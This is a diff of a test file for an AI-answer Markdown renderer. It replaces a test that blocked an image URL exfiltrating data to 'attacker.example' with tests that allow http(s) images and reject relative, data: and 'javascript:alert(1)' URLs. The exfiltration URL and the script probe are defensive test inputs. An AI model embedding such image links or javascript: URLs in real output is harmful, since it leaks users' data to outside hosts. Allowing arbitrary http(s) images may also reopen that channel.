@@ -40,10 +40,24 @@ describe("AnswerMarkdown safety", () => {
     expect(container).toHaveTextContent("Before");
   });
 
-  it("does not render markdown images", () => {
-    const { container } = renderAnswer("![secret](https://attacker.example/collect?data=secret)");
+  it("renders http(s) markdown images without a referrer and lazily", () => {
+    const { container } = renderAnswer("![Site plan](https://example.com/plan.png)");
+
+    const image = container.querySelector("img");
+    expect(image).not.toBeNull();
+    expect(image).toHaveAttribute("src", "https://example.com/plan.png");
+    expect(image).toHaveAttribute("alt", "Site plan");
+    expect(image).toHaveAttribute("referrerpolicy", "no-referrer");
+    expect(image).toHaveAttribute("loading", "lazy");
+  });
+
+  it("does not render images with non-http(s) URLs", () => {
+    const { container } = renderAnswer(
+      "![local](/api/evidence/E1) ![data](data:image/png;base64,AAAA) ![js](javascript:alert(1))",
+    );
 
     expect(container.querySelector("img")).toBeNull();
+    expect(container).toHaveTextContent("local");
   });
 
   it("removes javascript: URLs from links and opens other links safely", () => {
